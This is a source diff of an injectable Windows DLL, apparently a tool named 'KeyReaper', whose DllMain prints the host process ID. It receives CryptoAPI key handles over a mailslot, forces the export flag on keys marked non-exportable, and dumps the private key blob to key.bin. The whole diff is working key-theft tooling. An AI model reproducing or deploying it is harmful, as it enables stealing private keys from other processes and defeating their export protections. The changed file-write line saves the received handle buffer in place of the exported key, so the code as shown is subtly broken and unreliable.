@@ -5,21 +5,25 @@ https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
 */
 
 #include <windows.h>
+#include <wincrypt.h>
+#include <fstream>
+#include <string>
 #pragma comment (lib, "user32.lib")
 
 #include "program_result.h"
 using ErrorResult = error_handling::ErrorResult;
 using OkResult = error_handling::OkResult;
 
+#include "cryptoapi.h"
 #include "injection/interproc_coms.h"
-using namespace process_injection;
+using namespace custom_ipc;
 
 DWORD timeout_millis = 20000;
-HANDLE mailslot_thread = NULL;
 
 int StartMailSlot();
 
 extern "C" __declspec(dllexport) void StartMailSlotExporter(LPVOID lpParam) {
+  printf("Started mailslot\n");
   StartMailSlot();
 }
 
@@ -42,7 +46,8 @@ extern "C" __declspec(dllexport) void StartServer(LPVOID lpParam) {
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
   switch (nReason) {
   case DLL_PROCESS_ATTACH:
-    ShowGUIMessage("Successfully injected");
+    // ShowGUIMessage("DLL loaded in process");
+    printf("PID: %u\n", GetCurrentProcessId());
     break;
   case DLL_PROCESS_DETACH:
     break;
@@ -58,29 +63,30 @@ BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
 #include <iostream>
 #define PRIVATEKEYBLOB_SIZE 0x254
 int StartMailSlot() {
-  ShowGUIMessage("Starting mailslot");
-  LPCSTR slot_name = "\\\\.\\mailslot\\MyMailslot";
-  
   // Create the mailslot
-  HANDLE hMailslot = CreateMailslotA(slot_name, 4, MAILSLOT_WAIT_FOREVER, NULL);
+  LPCSTR slot_name = "\\\\.\\mailslot\\KeyReaperServer";
+  HANDLE hMailslot = CreateMailslotA(slot_name, sizeof(HCRYPTKEY), MAILSLOT_WAIT_FOREVER, NULL);
   if (hMailslot == INVALID_HANDLE_VALUE) {
-    std::cerr << "Failed to create mailslot. Error: " << GetLastError() << std::endl;
+    std::cerr << "Failed to create mailslot. The server might already be running. \nError: " << GetLastError() << std::endl;
     return 1;
   }
   std::cout << "Mailslot created. Waiting for messages..." << std::endl;
 
   while (true) {
     DWORD bytesRead;
-    unsigned char buffer[4];  // 4-byte buffer
+    // unsigned char* buffer = (unsigned char*) malloc(sizeof(HCRYPTKEY));
+    auto buffer = std::vector<BYTE>(sizeof(HCRYPTKEY), 0);
 
-    if (ReadFile(hMailslot, buffer, sizeof(buffer), &bytesRead, NULL)) {
+    if (ReadFile(hMailslot, buffer.data(), sizeof(HCRYPTKEY), &bytesRead, NULL)) {
       std::cout << "Received message: ";
       for (SIZE_T i = 0; i < bytesRead; ++i) {
         printf("%02X ", buffer[i]);
       } printf("\n");
       
-      HCRYPTKEY key = *(reinterpret_cast<HCRYPTKEY*>(buffer));
-      printf("Exporting key: %08X\n", key);
+      HCRYPTKEY key = *(reinterpret_cast<HCRYPTKEY*>(buffer.data()));
+      key_scanner::cryptoapi::ForceExportBit(key);
+
+      printf("Exporting key: 0x%p\n", (void*) key);
 
       BYTE key_buffer[PRIVATEKEYBLOB_SIZE];
       ZeroMemory(key_buffer, PRIVATEKEYBLOB_SIZE);
@@ -97,9 +103,10 @@ int StartMailSlot() {
       if (res == 0) std::cerr << " [x] Could not export the key: " << error_handling::GetLastErrorAsString() << std::endl;
       else {
         printf(" [i] Key successfully exported, exporting it to a file\n");
-        FILE* file = fopen("key.bin", "wb");
-        fwrite(key_buffer, 1, data_len, file);
-        fclose(file);
+        std::ofstream file("key.bin", std::ios::binary);
+        if (file) {
+          file.write(reinterpret_cast<const char*>(buffer.data()), data_len);
+        } else printf(" [x] Could not open file");
       }
     } else {
       std::cerr << "Failed to read from mailslot. Error: " << GetLastError() << std::endl;
